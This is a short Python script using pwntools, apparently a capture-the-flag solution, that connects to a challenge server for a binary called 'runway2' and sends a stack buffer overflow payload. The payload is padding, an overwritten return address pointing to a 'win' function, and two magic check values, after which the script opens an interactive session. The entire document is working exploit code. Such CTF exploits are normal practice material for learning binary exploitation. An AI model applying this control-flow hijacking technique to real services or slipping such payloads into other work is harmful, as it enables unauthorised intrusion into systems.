from pwn import *

# Start the process
# p = process('./runway2')  # Replace with the name of your compiled C binary
p = remote('challs.pwnoh.io', 13402)

# Calculate the address of the win function
win_address = p32(0x08049206)  # Change this to the correct address of the win function

# Define the values for check and mate
check_value = 0xc0ffee
mate_value = 0x007ab1e

# Create the payload
buffer_size = 16  # Size of the answer buffer
padding_size = buffer_size + 12  # 4 bytes for the return address + 4 bytes for check + 4 bytes for mate

# Create padding with 'A's to overflow the buffer
padding = b'A' * padding_size  # Padding to fill the buffer
# Construct the payload
payload = padding + win_address + b'a'*4 + p32(check_value) + p32(mate_value)  # Final payload

# Send the payload
p.sendline(payload)

# Drop to an interactive shell if the exploit was successful
p.interactive()
# print(p.recv())


